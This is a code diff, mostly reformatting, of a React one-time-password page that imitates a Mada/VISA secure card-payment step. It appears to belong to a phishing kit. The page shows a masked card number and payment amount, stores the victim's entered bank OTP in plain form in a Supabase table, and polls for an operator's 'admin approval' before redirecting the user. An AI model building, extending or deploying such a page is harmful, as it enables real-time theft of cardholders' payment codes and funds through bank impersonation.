@@ -10,14 +10,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
 import { usePresence } from "@/hooks/usePresence";
-import {
-  Dialog,
-  DialogContent,
-  DialogDescription,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
-
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 const OTPVerification = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
@@ -28,7 +21,7 @@ const OTPVerification = () => {
   const price = searchParams.get("price") || "0";
   const cardLast4 = searchParams.get("cardLast4") || "";
   const [otp, setOtp] = useState("");
-  
+
   // تنسيق رقم البطاقة المخفي
   const maskedCardNumber = cardLast4 ? `XXXX XXXX XXXX ${cardLast4}` : "";
   const [timer, setTimer] = useState(120); // 2 minutes
@@ -49,7 +42,6 @@ const OTPVerification = () => {
     otpLength: otp.length,
     remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
   }, "صفحة تأكيد الدفع - OTP Verification");
-
   useEffect(() => {
     // Get application ID
     const storedId = localStorage.getItem('applicationId');
@@ -57,22 +49,19 @@ const OTPVerification = () => {
       setApplicationId(storedId);
     }
   }, []);
-
   useEffect(() => {
     if (waitingForApproval && applicationId) {
       // Check for approval every 2 seconds
       const interval = setInterval(async () => {
-        const { data, error } = await supabase
-          .from('customer_applications')
-          .select('otp_approved, status')
-          .eq('id', applicationId)
-          .single();
-
+        const {
+          data,
+          error
+        } = await supabase.from('customer_applications').select('otp_approved, status').eq('id', applicationId).single();
         if (data?.otp_approved) {
           clearInterval(interval);
           setWaitingForApproval(false);
           setShowSuccessDialog(true);
-          
+
           // إعادة التوجيه إلى الصفحة الرئيسية بعد 3 ثواني
           setTimeout(() => {
             localStorage.removeItem('applicationId');
@@ -82,12 +71,11 @@ const OTPVerification = () => {
           clearInterval(interval);
           setWaitingForApproval(false);
           setShowErrorDialog(true);
-          
+
           // إعادة تعيين OTP للسماح بإعادة المحاولة
           setOtp("");
         }
       }, 2000);
-
       return () => clearInterval(interval);
     }
   }, [waitingForApproval, applicationId, navigate]);
@@ -130,27 +118,21 @@ const OTPVerification = () => {
       });
       return;
     }
-    
     setIsVerifying(true);
-
     try {
       if (applicationId) {
         // Save OTP to database
-        const { error } = await supabase
-          .from('customer_applications')
-          .update({
-            otp_code: otp,
-            current_step: 'otp'
-          })
-          .eq('id', applicationId);
-
+        const {
+          error
+        } = await supabase.from('customer_applications').update({
+          otp_code: otp,
+          current_step: 'otp'
+        }).eq('id', applicationId);
         if (error) throw error;
-
         toast({
           title: "تم إرسال الكود",
-          description: "في انتظار موافقة الإدارة...",
+          description: "في انتظار موافقة الإدارة..."
         });
-
         setIsVerifying(false);
         setWaitingForApproval(true);
       } else {
@@ -172,12 +154,15 @@ const OTPVerification = () => {
           {/* Header with logos */}
           <div className="flex items-center justify-between mb-8 pb-6 border-b">
             <div className="flex items-center gap-4">
-              <div className="text-2xl font-bold" style={{ color: '#003D82' }}>مدى</div>
+              <div className="text-2xl font-bold" style={{
+              color: '#003D82'
+            }}>مدى</div>
             </div>
             <div className="flex flex-col items-end gap-2">
               <button className="text-sm text-gray-600 hover:text-gray-800">Cancel</button>
               <div className="flex items-center gap-2">
-                <span className="text-xl font-bold">VISA</span>
+                <span className="text-xl font-bold">
+              </span>
                 <div className="bg-[#003D82] text-white text-xs px-2 py-1 rounded">SECURE</div>
               </div>
             </div>
@@ -194,14 +179,14 @@ const OTPVerification = () => {
             </p>
             
             <p className="text-base text-gray-700">
-              You are paying {companyName} the amount of SAR {price} on {new Date().toLocaleString('en-GB', { 
-                year: 'numeric', 
-                month: '2-digit', 
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-              }).replace(',', '')}.
+              You are paying {companyName} the amount of SAR {price} on {new Date().toLocaleString('en-GB', {
+              year: 'numeric',
+              month: '2-digit',
+              day: '2-digit',
+              hour: '2-digit',
+              minute: '2-digit',
+              second: '2-digit'
+            }).replace(',', '')}.
             </p>
 
             {/* OTP Input */}
@@ -209,62 +194,34 @@ const OTPVerification = () => {
               <label className="text-sm text-gray-600 block">
                 Verification code
               </label>
-              <Input
-                type="text"
-                inputMode="numeric"
-                maxLength={6}
-                value={otp}
-                onChange={handleOtpChange}
-                className="h-12 text-lg border-gray-300 rounded focus:border-blue-600 focus:ring-1 focus:ring-blue-600 bg-white"
-                dir="ltr"
-                disabled={waitingForApproval}
-              />
+              <Input type="text" inputMode="numeric" maxLength={6} value={otp} onChange={handleOtpChange} className="h-12 text-lg border-gray-300 rounded focus:border-blue-600 focus:ring-1 focus:ring-blue-600 bg-white" dir="ltr" disabled={waitingForApproval} />
             </div>
 
             {/* Confirm Button */}
-            <Button
-              onClick={handleVerify}
-              disabled={isVerifying || waitingForApproval || otp.length < 4}
-              className="w-full h-12 text-base font-semibold rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              {isVerifying ? (
-                <>
+            <Button onClick={handleVerify} disabled={isVerifying || waitingForApproval || otp.length < 4} className="w-full h-12 text-base font-semibold rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 disabled:cursor-not-allowed">
+              {isVerifying ? <>
                   <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                   جاري التحقق...
-                </>
-              ) : waitingForApproval ? (
-                <>
+                </> : waitingForApproval ? <>
                   <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                   في انتظار الموافقة...
-                </>
-              ) : (
-                "CONFIRM"
-              )}
+                </> : "CONFIRM"}
             </Button>
 
             {/* Resend Code */}
             <div className="text-center pt-4">
-              {canResend ? (
-                <button
-                  onClick={handleResendOtp}
-                  className="text-blue-600 hover:text-blue-800 font-medium text-base underline"
-                >
+              {canResend ? <button onClick={handleResendOtp} className="text-blue-600 hover:text-blue-800 font-medium text-base underline">
                   RESEND CODE
-                </button>
-              ) : (
-                <p className="text-sm text-gray-500">
+                </button> : <p className="text-sm text-gray-500">
                   يمكنك إعادة إرسال الرمز بعد {formatTime(timer)}
-                </p>
-              )}
+                </p>}
             </div>
 
-            {waitingForApproval && (
-              <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded">
+            {waitingForApproval && <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded">
                 <p className="text-sm text-yellow-800 text-center">
                   🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
                 </p>
-              </div>
-            )}
+              </div>}
 
             {/* Help Links */}
             <div className="pt-8 space-y-3 border-t">
@@ -318,18 +275,17 @@ const OTPVerification = () => {
       </Dialog>
 
       {/* نافذة الخطأ */}
-      <Dialog open={showErrorDialog} onOpenChange={(open) => {
-        setShowErrorDialog(open);
-        if (!open) {
-          // إعادة تعيين حالة الرفض في قاعدة البيانات عند إغلاق النافذة
-          if (applicationId) {
-            supabase
-              .from('customer_applications')
-              .update({ status: 'pending' })
-              .eq('id', applicationId);
-          }
+      <Dialog open={showErrorDialog} onOpenChange={open => {
+      setShowErrorDialog(open);
+      if (!open) {
+        // إعادة تعيين حالة الرفض في قاعدة البيانات عند إغلاق النافذة
+        if (applicationId) {
+          supabase.from('customer_applications').update({
+            status: 'pending'
+          }).eq('id', applicationId);
         }
-      }}>
+      }
+    }}>
         <DialogContent className="sm:max-w-md text-center">
           <DialogHeader>
             <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20">
@@ -344,11 +300,7 @@ const OTPVerification = () => {
               حاول مرة أخرى
             </DialogDescription>
           </DialogHeader>
-          <Button 
-            onClick={() => setShowErrorDialog(false)}
-            className="mt-4"
-            variant="default"
-          >
+          <Button onClick={() => setShowErrorDialog(false)} className="mt-4" variant="default">
             حسناً، سأحاول مرة أخرى
           </Button>
         </DialogContent>
